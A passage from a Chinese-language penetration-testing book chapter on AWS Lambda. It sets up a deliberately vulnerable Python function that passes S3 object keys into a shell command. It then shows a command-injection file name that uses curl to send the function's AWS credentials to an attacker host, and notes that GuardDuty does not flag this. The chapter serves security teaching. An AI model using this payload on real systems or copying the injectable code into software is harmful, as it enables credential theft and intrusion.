# 第十二章：AWS Lambda 的安全性和渗透测试

AWS Lambda 是一个令人惊叹的服务，为用户提供无服务器函数和应用程序。基本上，您创建一个带有要执行的代码的 Lambda 函数，然后创建某种触发器，每当触发该触发器时，您的 Lambda 函数将执行。用户只需支付 Lambda 函数运行所需的时间，最长为 15 分钟（但可以根据每个函数的需要手动降低）。Lambda 提供了多种编程语言供您的函数使用，甚至允许您设置自己的运行时以使用它尚不直接支持的语言。在我们深入研究所有这些之前，我们应该澄清无服务器是什么。尽管无服务器听起来好像没有涉及服务器，但 Lambda 基本上只是为函数需要运行的持续时间启动一个隔离的服务器。因此，仍然涉及服务器，但作为用户，您不需要处理服务器的规划、加固等。

对攻击者来说，这意味着我们仍然可以执行代码，使用文件系统，并执行大多数您可以在常规服务器上执行的其他活动，但有一些注意事项。其中之一是整个文件系统被挂载为只读，这意味着您无法直接修改系统上的任何内容，除了`/tmp`目录。`/tmp`目录是提供给 Lambda 函数在执行过程中根据需要写入文件的临时位置。另一个是您无法在这些服务器上获得 root 权限。简单明了，您只需接受您将永远成为 Lambda 函数中的低级用户。如果您确实找到了提升为 root 用户的方法，我相信 AWS 安全团队的人会很乐意听到这个消息。

在现实世界中，您可能会使用 Lambda 的一个示例场景是对上传到特定 S3 存储桶的任何文件进行病毒扫描。每次上传文件到该存储桶时，Lambda 函数将被触发，并传递上传事件的详细信息。然后，函数可能会将该文件下载到`/tmp`目录，然后使用 ClamAV（[`www.clamav.net/`](https://www.clamav.net/)）之类的工具对其进行病毒扫描。如果扫描通过，执行将完成。如果扫描标记文件为病毒，它可能会删除 S3 中相应的对象。

在本章中，我们将涵盖以下主题：

+   设置一个易受攻击的 Lambda 函数

+   使用读取访问攻击 Lambda 函数

+   使用读写访问攻击 Lamda 函数

+   转向虚拟私有云

# 设置一个易受攻击的 Lambda 函数

S3 中用于病毒扫描文件的 Lambda 函数的先前示例与我们将在自己的环境中设置的类似，但更复杂。我们指定的 S3 存储桶上传文件时，我们的函数将被触发，然后下载该文件，检查内容，然后根据发现的内容在 S3 对象上放置标签。这个函数将有一些编程错误，使其容易受到利用，以便进行演示，所以不要在生产账户中运行这个函数！

在我们开始创建 Lambda 函数之前，让我们首先设置将触发我们函数的 S3 存储桶和我们函数将承担的 IAM 角色。导航到 S3 仪表板（单击服务下拉菜单并搜索 S3），然后单击“创建存储桶”按钮：

![](img/b9113130-2785-4746-a8a8-999b47ef9ea9.png)

S3 仪表板上的“创建存储桶”按钮

现在，给您的存储桶一个唯一的名称；我们将使用 bucket-for-lambda-pentesting，但您可能需要选择其他内容。对于地区，我们选择美国西部（俄勒冈州），也称为 us-west-2。然后，单击“下一步”，然后再次单击“下一步”，然后再次单击“下一步”。将这些页面上的所有内容保留为默认设置。现在，您应该看到您的 S3 存储桶的摘要。单击“创建存储桶”以创建它：

！[](img/23b01b13-0858-49ba-92a4-eadfe7664eb8.png)

单击的最终按钮以创建您的 S3 存储桶

现在，在您的存储桶列表中显示存储桶名称时，单击该名称，这将完成我们的 Lambda 函数的 S3 存储桶设置（暂时）。

在浏览器中保留该选项卡打开，并在另一个选项卡中打开 IAM 仪表板（服务| IAM）。在屏幕左侧的列表中单击“角色”，然后单击左上角的“创建角色”按钮。在选择受信任实体类型下，选择 AWS 服务，这应该是默认值。然后，在“选择将使用此角色的服务”下，选择 Lambda，然后单击“下一步：权限”：

！[](img/e605c290-0a64-4bf5-a8fb-8b333713d7b1.png)

为我们的 Lambda 函数创建一个新角色

在此页面上，搜索 AWS 托管策略`AWSLambdaBasicExecutionRole`，并单击其旁边的复选框。此策略将允许我们的 Lambda 函数将执行日志推送到 CloudWatch，并且从某种意义上说，这是 Lambda 函数应该提供的最低权限集。可以撤销这些权限，但是 Lambda 函数将继续尝试写日志，并且将继续收到访问被拒绝的响应，这对于观察的人来说会很嘈杂。

现在，搜索 AWS 托管策略`AmazonS3FullAccess`，并单击其旁边的复选框。这将使我们的 Lambda 函数能够与 S3 服务进行交互。请注意，对于我们的 Lambda 函数用例来说，此策略过于宽松，因为它允许对任何 S3 资源进行完全的 S3 访问，而从技术上讲，我们只需要对我们的单个 bucket-for-lambda-pentesting S3 存储桶进行少量的 S3 权限。通常，您会发现在攻击的 AWS 帐户中存在过度授权的资源，这对于您作为攻击者来说没有任何好处，因此这将成为我们演示场景的一部分。

现在，单击屏幕右下角的“下一步：标记”按钮。我们不需要向此角色添加任何标记，因为这些通常用于我们现在需要担心的其他原因，所以只需单击“下一步：立即审阅”。现在，为您的角色创建一个名称；对于此演示，我们将其命名为`LambdaRoleForVulnerableFunction`，并且我们将保留角色描述为默认值，但如果您愿意，可以在其中编写自己的描述。现在，通过单击屏幕右下角的“创建角色”来完成此部分。如果一切顺利，您应该会在屏幕顶部看到成功消息：

！[](img/43a084b8-68c6-4fd8-ab95-65f27053d85d.png)

我们的 IAM 角色已成功创建

最后，我们可以开始创建实际的易受攻击的 Lambda 函数。要这样做，请转到 Lambda 仪表板（服务| Lambda），然后单击“创建函数”，这应该出现在欢迎页面上（因为可能您还没有创建任何函数）。请注意，这仍然位于美国西部（俄勒冈州）/ us-west-2 地区，就像我们的 S3 存储桶一样。

然后，在顶部选择从头开始。现在，为您的函数命名。对于此演示，我们将其命名为`VulnerableFunction`。接下来，我们需要选择我们的运行时，可以是各种不同的编程语言。对于此演示，我们将选择 Python 3.7 作为我们的运行时。

对于角色选项，请选择选择现有角色，然后在现有角色选项下，选择我们刚刚创建的角色（LambdaRoleForVulnerableFunction）。最后，单击右下角的“创建函数”：

！[](img/8694b8c0-c1eb-4cbd-9196-047d9f9cee33.png)

我们新的易受攻击的 Lambda 函数设置的所有选项

现在，您应该进入新易受攻击函数的仪表板，该仪表板可让您查看和配置 Lambda 函数的各种设置。

目前，我们可以暂时忽略此页面上的大部分内容，但是如果您想了解有关 Lambda 本身的更多信息，我建议您阅读 AWS 用户指南：[`docs.aws.amazon.com/lambda/latest/dg/welcome.html`](https://docs.aws.amazon.com/lambda/latest/dg/welcome.html)。现在，向下滚动到“函数代码”部分。我们可以看到“处理程序”下的值是`lambda_function.lambda_handler`。这意味着当函数被调用时，`lambda_function.py`文件中名为`lambda_handler`的函数将作为 Lambda 函数的入口点执行。`lambda_function.py`文件应该已经打开，但如果没有，请在“函数代码”部分左侧的文件列表中双击它：

![](img/922ccc81-4968-4ff3-b55b-6ab9768b7bff.png)

Lambda 函数处理程序及其引用的值

如果您选择了不同的编程语言作为函数的运行时，您可能会遇到略有不同的格式，但总体上它们应该是相似的。

现在我们已经有了 Lambda 函数、Lambda 函数的 IAM 角色和我们创建的 S3 存储桶，我们将在我们的 S3 存储桶上创建事件触发器，每次触发时都会调用我们的 Lambda 函数。要做到这一点，返回到您的 bucket-for-lambda-pentesting S3 存储桶所在的浏览器选项卡，单击“属性”选项卡，然后向下滚动到“高级设置”下的选项，单击“事件”按钮：

![](img/79acebbb-ca45-4849-a784-d4bc0a804b90.png)

访问我们 S3 存储桶的事件设置

接下来，单击“添加通知”，并将此通知命名为`LambdaTriggerOnS3Upload`。在“事件”部分下，选中“所有对象创建事件”旁边的复选框，这对我们的需求已经足够了。对于此通知，我们将希望将“前缀”和“后缀”留空。单击“发送到”下拉菜单，并选择“Lambda 函数”，然后应该显示另一个下拉菜单，您可以在其中选择我们创建的函数`VulnerableFunction`。最后，单击“保存”：

![](img/21d55ec4-ab79-43b6-9599-92d21a346d6b.png)

我们想要的新通知配置

单击“保存”后，**事件**按钮应显示 1 个活动通知：

![](img/03ddc31b-ac53-4e0e-af6f-65e75a248fe4.png)

我们刚刚设置的通知。

如果您返回到 Lambda 函数仪表板并刷新页面，您应该看到 S3 已被添加为左侧“设计”部分中我们 Lambda 函数的触发器：

![](img/13b360a6-5717-4302-b326-75bb3cd3e3c6.png)

Lambda 函数知道它将被我们刚刚设置的通知触发

基本上，我们刚刚告诉我们的 S3 存储桶，每当创建一个对象（`/uploaded/`等），它都应该调用我们的 Lambda 函数。S3 将自动调用 Lambda 函数，并通过`event`参数传递与通过`event`参数传递的上传文件相关的详细信息，这是我们的函数接受的两个参数之一（`event`和`context`）。Lambda 函数可以通过在执行过程中查看`event`的内容来读取这些数据。

要完成我们易受攻击的 Lambda 函数的设置，我们需要向其中添加一些易受攻击的代码！在 Lambda 函数仪表板上，在“函数代码”下，用以下代码替换默认代码：

```
import boto3
import subprocess
import urllib

def lambda_handler(event, context):
    s3 = boto3.client('s3')

    for record in event['Records']:
        try:
            bucket_name = record['s3']['bucket']['name']
            object_key = record['s3']['object']['key']
            object_key = urllib.parse.unquote_plus(object_key)

            if object_key[-4:] != '.zip':
                print('Not a zip file, not tagging')
                continue

            response = s3.get_object(
                Bucket=bucket_name,
                Key=object_key
            )

            file_download_path = f'/tmp/{object_key.split("/")[-1]}'
            with open(file_download_path, 'wb+') as file:
                file.write(response['Body'].read())

            file_count = subprocess.check_output(
                f'zipinfo {file_download_path} | grep ^- | wc -l',
                shell=True,
                stderr=subprocess.STDOUT
            ).decode().rstrip()
            s3.put_object_tagging(
                Bucket=bucket_name,
                Key=object_key,
                Tagging={
                    'TagSet': [
                        {
                            'Key': 'NumOfFilesInZip',
                            'Value': file_count
                        }
                    ]
                }
            )
        except Exception as e:
            print(f'Error on object {object_key} in bucket {bucket_name}: {e}')
    return
```

当我们继续阅读本章时，我们将更深入地了解这个函数的运行情况。简单来说，每当文件上传到我们的 S3 存储桶时，这个函数就会被触发；它将确认文件是否具有`.zip`扩展名，然后将文件下载到`/tmp`目录中。下载完成后，它将使用`zipinfo`、`grep`和`wc`程序来计算 ZIP 文件中存储了多少文件。然后它将向 S3 中的对象添加一个标签，指定该 ZIP 文件中有多少个文件。你可能已经能够看到一些问题可能出现的地方，但我们稍后会讨论这些问题。

我们要做的最后一件事是下拉到 Lambda 仪表板的环境变量部分，并添加一个带有键`app_secret`和值`1234567890`的环境变量：

![](img/aed37b17-a967-4953-b477-aa5c0c6db456.png)

将 app_secret 环境变量添加到我们的函数中。

要完成本节，只需点击屏幕右上角的大橙色保存按钮，将此代码保存到您的 Lambda 函数中，我们就可以继续了。

# 使用只读访问攻击 Lambda 函数

要开始本章的只读访问部分，我们将创建一个具有特定权限集的新 IAM 用户。这是我们将用来演示攻击的用户，因此我们可以假设我们以某种方式刚刚窃取了这个用户的密钥。这些权限将允许对 AWS Lambda 进行只读访问，并允许向 S3 上传对象，但不会超出此范围。我们不会详细介绍创建用户、设置其权限并将其密钥添加到 AWS CLI 的整个过程，因为我们在之前的章节中已经涵盖了这些内容。

因此，请继续创建一个具有对 AWS 的编程访问权限的新 IAM 用户。对于这个演示，我们将命名该用户为`LambdaReadOnlyTester`。接下来，我们将添加一个自定义的内联 IAM 策略，使用以下 JSON 文档：

```
{
    "Version": "2012-10-17",
     "Statement": [
        {
            "Effect": "Allow",
            "Action": [
                "lambda:List*",
                "lambda:Get*",
                "s3:PutObject"
            ],
            "Resource": "*"
        }
    ]
}
```

正如你所看到的，我们可以使用任何以`List`或`Get`开头的 Lambda API，以及使用 S3 的`PutObject` API。这就像我在许多 AWS 环境中看到的情况，用户对各种资源具有广泛的读取权限，然后还有一些额外的 S3 权限，比如上传文件的能力。

在作为攻击者查看 AWS Lambda 时，首先要做的是获取账户中每个 Lambda 函数的所有相关数据。这可以通过 Lambda 的`ListFunctions` API 来完成。对于这个演示，我们已经知道我们想要攻击的函数在`us-west-2`，但在实际情况下，你可能想要检查每个区域是否有可能感兴趣的 Lambda 函数。我们将首先运行以下 AWS CLI 命令：

```
aws lambda list-functions --profile LambdaReadOnlyTester --region us-west-2
```

我们应该得到一些有用的信息。首先要查找的是环境变量。我们自己设置了这个有漏洞的函数，所以环境变量对我们来说并不是什么秘密，但作为攻击者，你经常可以发现存储在函数的环境变量中的敏感信息。这些信息在我们刚刚进行的`ListFunctions`调用中以`"Environment"`键的形式返回给我们，对于我们的有漏洞的函数，它应该看起来像这样：

```
"Environment": {
    "Variables": {
        "app_secret": "1234567890"
    }
}
```

你可以指望在 Lambda 函数的环境变量中发现各种意想不到的东西。作为攻击者，`"app_secret"`的值听起来很有趣。在过去的渗透测试中，我在环境变量中发现了各种秘密，包括用户名/密码/第三方服务的 API 密钥，AWS API 密钥到完全不同的账户，以及更多。仅仅查看几个 Lambda 函数的环境变量就让我多次提升了自己的权限，因此重要的是要注意存储的内容。我们自己设置了这个有漏洞的函数，所以我们知道`"app_secret"`环境变量对我们来说没有什么用，但它被包含在其中是为了演示这个想法。

在运行 Lambda `ListFunctions` API 调用时，如果函数设置了环境变量，`"Environment"`键将只包括在结果中；否则，它不会显示在结果中，所以如果那里没有任何内容可用，不要担心。

在检查环境变量之后，现在是查看每个 Lambda 函数的代码的好时机。要从 AWS CLI 中执行此操作，我们可以使用从`ListFunctions`获得的函数列表，并将每个函数通过 Lambda `GetFunction` API 调用运行。对于我们的易受攻击函数，我们可以运行以下命令：

```
aws lambda get-function --function-name VulnerableFunction --profile LambdaReadOnlyTester --region us-west-2
```

输出将看起来像运行`ListFunctions`时为每个函数返回的内容，但有一个重要的区别，即添加了`Code`键。这个键将包括`RepositoryType`和`Location`键，这是我们将代码下载到这个函数的方式。我们只需要复制 Code | Location 下的 URL 并粘贴到我们的网络浏览器中。提供的 URL 是一个预签名的 URL，它给了我们访问存储 Lambda 代码的 S3 存储桶的权限。访问页面后，它应该会下载一个以`VulnerableFunction`开头的`.zip`文件。

如果您解压文件，您会看到一个名为`lambda_function.py`的单个文件，其中存储了 Lambda 函数的代码。在许多情况下，那里会有多个文件，如第三方库、配置文件或二进制文件。

尽管我们的易受攻击函数相对较短，但我们将以它是大量代码的方式来处理，因为我们不能仅仅手动快速分析来模拟真实情况，因为您可能不熟悉 Lambda 函数使用的编程语言。

将函数解压到我们的计算机上后，我们现在将开始对包含的代码进行静态分析。我们知道这个函数正在运行 Python 3.7，因为当我们运行`ListFunctions`和`GetFunction`时，`Runtime`下列出了 Python 3.7，并且主文件是一个`.py`文件。代码的静态分析有许多选项，免费和付费的，它们在不同的编程语言之间有所不同，但我们将使用`Bandit`，它被描述为一个旨在发现 Python 代码中常见安全问题的工具。在继续之前，请注意，仅仅因为我们在这里使用它，并不一定意味着它是最好的和/或完美的。我建议您进行自己的研究，并尝试不同的工具，找到自己喜欢的工具，但 Bandit 是我个人喜欢使用的工具之一。Bandit 托管在 GitHub 上[`github.com/PyCQA/bandit`](https://github.com/PyCQA/bandit)。

Bandit 的安装很简单，因为它是通过 PyPI 提供的，这意味着我们可以使用 Python 包管理器`pip`来安装它。按照 Bandit GitHub 上的说明，我们将运行以下命令（一定要自行检查，以防有任何更新）：

```
virtualenv bandit-env
pip3 install bandit
```

我们使用`virtualenv`，以避免安装 Python 依赖项时出现任何问题，然后我们使用`pip3`来安装`bandit`，因为我们要分析的代码是用 Python 3 编写的。在撰写本文时，安装了 Bandit 版本 1.5.1，因此如果在本节的其余部分遇到任何问题，请注意您自己安装的版本。安装完成后，我们可以切换到解压 Lambda 函数的目录，然后使用`bandit`命令来针对包含我们代码的文件夹。我们可以使用以下命令来执行：

```
bandit -r ./VulnerableFunction/
```

现在 Lambda 函数将被扫描，`-r`标志指定递归，即扫描`VulnerableFunction`文件夹中的每个文件。我们现在只有一个文件，但了解这个标志对我们正在扫描的更大的 Lambda 函数有什么作用是很有用的。Bandit 完成后，我们将看到它报告了三个单独的问题：一个低严重性和高置信度，一个中等严重性和中等置信度，一个高严重性和高置信度：

![](img/6ad0c8d1-f53a-4200-a6a4-b49304c6b2e2.png)

Bandit 输出的结果

通常，静态源代码分析工具会输出相当数量的误报，因此重要的是要逐个检查每个问题，以验证它是否是一个真正的问题。静态分析工具也缺乏代码可能如何使用的上下文，因此安全问题可能对某些代码是一个问题，但对其他代码来说并不重要。在审查 Bandit 提出的第二个问题时，我们将更多地关注上下文。

查看 Bandit 报告的第一个问题，我们可以看到消息“考虑与子进程模块相关的可能安全影响”，这是非常有道理的。子进程模块用于在计算机上生成新进程，如果操作不正确可能会造成安全风险。我们将把这标记为一个有效问题，但在审查代码时要牢记这一点。

Bandit 报告的第二个问题告诉我们“可能不安全地使用了临时文件/目录”，并向我们显示了代码的行，其中一个变量被赋予了`/tmp`目录中文件路径的值，附加了另一个变量`object_key`。这是一个安全问题，在某些应用程序中可能是一个大问题，但考虑到我们 Lambda 函数的上下文，我们可以假设在这种情况下这不是一个问题。为什么？安全风险的一部分是可能有用户能够控制文件路径。用户可能会插入路径遍历序列或者欺骗脚本将临时文件写入其他位置，比如`/etc/shadow`，这可能会带来危险的后果。这对我们来说不是一个问题，因为代码在 Lambda 中运行，这意味着它在只读文件系统上运行；所以，即使有人能够遍历出`/tmp`目录，函数也无法覆盖系统上的任何重要文件。这里可能会出现其他可能的问题，但对我们来说没有直接适用的，所以我们可以把这个问题划掉为误报。

接下来是 Bandit 提出的最后一个最严重的问题，它告诉我们“识别出了使用 shell=True 的子进程调用，存在安全问题”，听起来很有趣。这告诉我们正在生成一个新进程，并且可以访问操作系统的 shell，这可能意味着我们可以注入 shell 命令！看看 Bandit 标记的行（第 30 行），我们甚至可以看到一个 Python 变量（`file_download_path`）直接连接到正在运行的命令中。这意味着如果我们可以以某种方式控制该值，我们可以修改在操作系统上运行的命令以执行任意代码。

接下来，我们想看看`file_download_path`在哪里被赋值。我们知道它的赋值出现在 Bandit 的问题＃2（第 25 行），代码如下：

```
file_download_path = f'/tmp/{object_key.split("/")[-1]}'
```

就像第 30 行的字符串一样，这里使用了 Python 3 的`f`字符串（有关更多信息，请参见[`docs.python.org/3/whatsnew/3.6.html#pep-498-formatted-string-literals`](https://docs.python.org/3/whatsnew/3.6.html#pep-498-formatted-string-literals)），它基本上允许您在字符串中嵌入变量和代码，因此您不必进行任何混乱的连接，使用加号或其他任何东西。我们在这里看到的是`file_download_path`是一个字符串，其中包含代码中的另一个变量`object_key`，它在其中的每个`"/"`处被拆分。然后，`[-1]`表示使用从`"/"`拆分而成的列表的最后一个元素。

现在，如果我们追溯`object_key`变量，看看它是在哪里被赋值的，我们可以看到在第 13 行，它被赋值为`record['s3']['object']['key']`的值。好的，我们可以看到函数期望`event`变量包含有关 S3 对象的信息（以及第 11 行的 S3 存储桶）。我们想弄清楚是否可以以某种方式控制该变量的值，但考虑到我们作为攻击者的上下文，我们不知道这个函数是否会定期被调用，也不知道如何调用。我们可以检查的第一件事是我们的 Lambda 函数是否有任何事件源映射。可以使用以下命令来完成这个任务：

```
aws lambda list-event-source-mappings --function-name VulnerableFunction --profile LambdaReadOnlyTester --region us-west-2
```

在这种情况下，我们应该得到一个空列表，如下所示：

```
{
    “EventSourceMappings”: []
}
```

事件源映射基本上是将 Lambda 函数连接到另一个服务的一种方式，以便在该服务中发生其他事情时触发它。事件源映射的一个示例是 DynamoDB，每当 DynamoDB 表中的项目被修改时，它就会触发一个 Lambda 函数，并包含被添加到表中的内容。正如您所看到的，我们当前的函数没有与此相关的内容，但现在不是恐慌的时候！并非每个自动触发源都会显示为事件源映射。

下一步将是查看 Lambda 函数的资源策略，它基本上指定了谁可以调用此函数。要获取资源策略，我们将使用`GetPolicy` API：

```
aws lambda get-policy --function-name VulnerableFunction --profile LambdaReadOnlyTester --region us-west-2
```

如果我们幸运的话，我们将得到一个 JSON 对象作为对此 API 调用的响应，但如果没有，我们可能会收到 API 错误，指示找不到资源。这将表明没有为 Lambda 函数设置资源策略。如果是这种情况，那么我们可能无法以任何方式调用此 Lambda 函数，除非我们碰巧拥有`lambda:InvokeFunction`权限（但在这种情况下我们没有）。

今天一定是我们的幸运日，因为我们得到了一个策略。它应该看起来像下面这样，只是`000000000000`将被您自己的 AWS 帐户 ID 替换，修订 ID 将不同：

```
{
    "Policy": "{\"Version\":\"2012-10-17\",\"Id\":\"default\",\"Statement\":[{\"Sid\":\"000000000000_event_permissions_for_LambdaTriggerOnS3Upload_from_bucket-for-lambda-pentesting_for_Vul\",\"Effect\":\"Allow\",\"Principal\":{\"Service\":\"s3.amazonaws.com\"},\"Action\":\"lambda:InvokeFunction\",\"Resource\":\"arn:aws:lambda:us-west-2:000000000000:function:VulnerableFunction\",\"Condition\":{\"StringEquals\":{\"AWS:SourceAccount\":\"000000000000\"},\"ArnLike\":{\"AWS:SourceArn\":\"arn:aws:s3:::bucket-for-lambda-pentesting\"}}}]}",
    "RevisionId": "d1e76306-4r3a-411c-b8cz-6x4731qa7f00"
}
```

混乱且难以阅读，对吧？这是因为一个 JSON 对象被存储为一个字符串，作为另一个 JSON 对象中一个键的值。为了使这一点更清晰，我们可以复制`"Policy"`键内的整个值，删除转义字符（`\`），并添加一些漂亮的缩进，然后我们将得到这样的结果：

```
{
    "Version": "2012-10-17",
    "Id": "default",
    "Statement": [
        {
            "Sid": "000000000000_event_permissions_for_LambdaTriggerOnS3Upload_from_bucket-for-lambda-pentesting_for_Vul",
            "Effect": "Allow",
            "Principal": {
                "Service": "s3.amazonaws.com"
            },
            "Action": "lambda:InvokeFunction",
            "Resource": "arn:aws:lambda:us-west-2:000000000000:function:VulnerableFunction",
            "Condition": {
                "StringEquals": {
                    "AWS:SourceAccount": "000000000000"
                },
                "ArnLike": {
                    "AWS:SourceArn": "arn:aws:s3:::bucket-for-lambda-pentesting"
                }
            }
        }
    ]
}
```

看起来好多了，不是吗？我们正在查看一个 JSON 策略文档，指定了什么可以调用这个 Lambda 函数，我们可以看到`"Action"`设置为`"lambda:InvokeFunction"`。接下来，我们可以看到`"Principal"`设置为 AWS 服务 S3。这听起来正确，因为我们知道该函数正在处理 S3 对象。在`"Resource"`下，我们看到了 Lambda 函数的 ARN，正如预期的那样。在`"Condition"`下，我们看到`"AWS:SourceAccount"`必须是`000000000000`，这是我们正在使用的账户 ID，所以很好。在`"Condition"`下还有`"ArnLike"`，显示了一个 S3 存储桶的 ARN。我们没有所需的 S3 权限去确认这些信息，但我们可以合理地假设某种 S3 事件已经设置好，当发生某些事情时会调用这个函数（我们知道这是真的，因为我们之前设置过）。

另一个重要的提示可以在`"Sid"`键中找到，我们可以看到值为`"000000000000_event_permissions_for_LambdaTriggerOnS3Upload_from_bucket-for-lambda-pentesting_for_Vul"`，这显示了`"LambdaTriggerOnS3Upload"`。现在我们可以做出一个合理的猜测，即当文件上传到 S3 存储桶`"bucket-for-lambda-pentesting"`时，将调用这个 Lambda 函数。如果你还记得我们设置这些资源时，`"LambdaTriggerOnS3Upload"`就是我们之前添加到 S3 存储桶的事件触发器的名称，所以在这种情况下，冗长的命名方案帮助了我们作为攻击者。更好的是，我们知道我们的受损用户被授予了`"s3:PutObject"`权限！

现在我们已经拼出了这个谜题的所有部分。我们知道 Lambda 函数运行一个带有变量（`file_download_path`）的 shell 命令，我们知道该变量由另一个变量（`object_key`）组成，我们知道该变量被设置为值`record['s3']['object']['key']`。我们还知道，每当文件上传到`"bucket-for-lambda-pentesting"` S3 存储桶时，就会调用这个 Lambda 函数，而且我们有必要的权限将文件上传到该存储桶。鉴于这一切，这意味着我们可以上传一个我们选择的文件，最终将其传递到一个 shell 命令中，这正是我们想要的，如果我们试图在系统上执行代码！

但是，等等；在运行 Lambda 函数的服务器上执行任意代码有什么好处呢？它是一个只读文件系统，而且我们已经有了源代码。更多的凭证，这就是好处！如果你还记得之前，我们需要创建一个 IAM 角色，附加到我们创建的 Lambda 函数上，然后允许我们的函数与 AWS API 进行身份验证。当 Lambda 函数运行时，它会假定附加到它的 IAM 角色，并获得一组临时凭证（记住，这是访问密钥 ID、秘密访问密钥和会话令牌）。Lambda 函数与 EC2 实例有些不同，这意味着没有`http://169.254.169.254`上的元数据服务，这意味着我们无法通过那里检索这些临时凭证。Lambda 的做法不同；它将凭证存储在环境变量中，所以一旦我们能在服务器上执行代码，我们就可以窃取这些凭证，然后我们将获得附加到 Lambda 函数的角色的所有权限。

在这种情况下，我们知道 LambdaRoleForVulnerableFunction IAM 角色具有完全的 S3 访问权限，这比我们微不足道的`PutObject`访问权限要多得多，它还具有一些 CloudWatch 日志权限。我们目前无法访问 CloudWatch 中的日志，所以我们需要将凭证窃取到我们控制的服务器上。否则，我们将无法读取这些值。

现在，让我们开始我们的有效载荷。有时，如果您将整个 Lambda 函数复制到自己的 AWS 帐户中，可能会有所帮助，这样您就可以使用有效载荷对其进行轰炸，直到找到有效的有效载荷，但我们将首先手动尝试。我们知道我们基本上控制`object_key`变量，最终将其放入 shell 命令中。因此，如果我们传入一个无害的值`"hello.zip"`，我们将看到以下内容：

```
Line 13: object_key is assigned the value of "hello.zip"

Line 14: object_key is URL decoded by urllib.parse.unquote_plus (Note: the reason this line is in the code is because the file name comes in with special characters URL encoded, so those need to be decoded to work with the S3 object directly)

Line 25: file_download_path is assigned the value of f'/tmp/{object_key.split("/")[-1]}', which ultimately resolves to "/tmp/hello.zip"

Lines 29-30: A shell command is run with the input f'zipinfo {file_download_path} | grep ^- | wc -l', which resolves to "zipinfo /tmp/hello.zip | grep ^- | wc -l".
```

似乎只有一个限制需要我们担心，那就是代码检查文件是否在第 16 行具有`.zip`扩展名。有了所有这些信息，我们现在可以开始制作恶意有效载荷。

`zipinfo /tmp/hello.zip`命令中直接包含了我们提供的字符串，因此我们只需要打破这个命令以运行我们自己的任意命令。如果我们将`hello.zip`更改为`hello;sleep 5;.zip`，那么最终命令将变成`"zipinfo /tmp/hello;sleep 5;.zip | grep ^- | wc -l"`。我们插入了几个分号，这会导致 shell 解释器（bash）认为有多个要执行的命令。不是运行单个命令`zipinfo /tmp/hello.zip`，而是运行`"zipinfo /tmp/hello"`，这将失败，因为那不是一个存在的文件；然后，它将运行`"sleep 5"`并休眠五秒，然后它将运行`".zip"`，这不是一个真正的命令，因此将抛出错误。

就像这样，我们已经将一个命令(`sleep 5`)注入到 Lambda 服务器的 shell 中。现在，因为这是盲目的（也就是说，我们看不到任何命令的输出），我们需要窃取我们想要的重要信息。支持 Lambda 函数的操作系统默认安装了`"curl"`，因此这将是进行外部请求的一种简单方法，我们知道 AWS 凭证存储在环境变量中，因此我们只需要`curl`凭证到我们控制的服务器。

为此，我在自己的服务器上设置了 NetCat 监听器（示例中的 IP 地址为`1.1.1.1`），端口为`80`，命令如下：

```
nc -nlvp 80
```

然后，我们将制定一个有效载荷，将窃取凭证。我们可以使用`"env"`命令访问环境变量，因此用 curl 向我们的外部服务器发出 HTTP POST 请求的一般命令，其中包括所有环境变量作为主体，如下所示：

```
curl -X POST -d "`env`" 1.1.1.1
```

这可能看起来有点奇怪，但因为`"env"`命令提供多行内容，所以需要将其放入引号中，否则它将破坏整个命令（尝试在自己的服务器上运行`"curl -X POST -d env 1.1.1.1"`并查看结果）。如果您不熟悉，反引号（`` ` ``）指示 bash 在执行整个`curl`命令之前运行`"env"`命令，这样它就会将这些变量`POST`到我们的外部服务器。此外，因为我们的服务器正在侦听端口`80`，所以我们不需要在`curl`命令中包括`http://`或端口，因为给定一个IP地址，默认情况下转到`http://1.1.1.1:80`. 这样我们可以避免很多不必要的字符。这可能不一定是一种传统的方法，但这个字符串的好处在于它很容易放入文件名，这正是我们利用这个 Lambda 函数所需要的！

回到我们的有效载荷；现在，我们需要将一个文件上传到 S3，文件名称如下：

```

hello;curl -X POST -d "`env`" 1.1.1.1;.zip

```

由于其中有双引号，Microsoft Windows 不允许您创建具有这个名称的文件，但在 Linux 中很容易做到。我们可以使用`touch`命令来创建文件。它看起来像这样：

```

touch 'hello;curl -X POST -d "`env`" 1.1.1.1;.zip'

```

上述命令的输出将如下所示：

![](img/215c8c00-1f95-48dd-b752-e4274bc82d14.png)

在我们自己的 Ubuntu 服务器上创建一个恶意名称的文件

现在一切都准备就绪了。我们只需确保我们的 NetCat 监听器已经在我们的外部服务器上启动，然后将此文件上传到 `bucket-for-lambda-pentesting` S3 存储桶，然后等待 Lambda 函数被调用，最后等待我们的恶意命令执行。我们可以通过使用 S3 `copy` AWS CLI 命令将我们的本地恶意文件复制到远程 S3 存储桶来上传它：

```

aws s3 cp ./'hello;curl -X POST -d "`env`" 1.1.1.1;.zip' s3://bucket-for-lambda-pentesting --profile LambdaReadOnlyTester

```

因为我们的恶意文件名，它看起来有点乱，但它所做的就是使用 S3 `copy` 命令作为`LambdaReadOnlyTester` AWS CLI 配置文件，将我们的本地恶意文件复制到`bucket-for-lambda-pentesting` S3 存储桶。执行此命令后，我们只需等待并观察我们的 NetCat 监听器，希望能获取一些凭据！几秒钟后，我们将看到以下内容：

![](img/972de3e2-9dfb-48ed-8a9d-75616e094317.png)

来自 Lambda 服务器的所有环境变量都发送到我们的 NetCat 监听器

我们成功了！我们成功地通过一种有时被称为事件注入的方法，在运行 Lambda 函数的服务器上实现了代码执行，然后我们成功地将附加到该 Lambda 函数的角色的凭据外传到我们的外部服务器。现在，您可以将这些凭据用于您的 AWS CLI，并且继续前进并征服！

附加奖励：在撰写本文时，GuardDuty 的`UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration` 发现类型 ([`docs.aws.amazon.com/guardduty/latest/ug/guardduty_unauthorized.html#unauthorized11`](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_unauthorized.html#unauthorized11)) 不适用于从 Lambda 服务器中获取的凭据！

最后要注意的一点是，我们利用了一种事件注入方法来利用这个 Lambda 函数，但还有很多其他类型。您可以通过各种方法触发 Lambda 函数调用，例如前面提到的 DynamoDB 示例，或者可能是通过 CloudWatch Events 规则。您只需找出如何将自己的输入传递给函数以控制执行。使这一切变得最简单、最快速的方法是使用自定义测试事件（如果您拥有`"lambda:InvokeFunction"`权限），因为您可以在事件中指定您需要的确切载荷。

在入侵测试 Lambda 函数（带有读取访问权限）时需要记住的其他事项包括以下内容：

+   检查与每个函数相关联的标签，查看是否包含敏感信息。这种可能性非常小，但并非不可能。

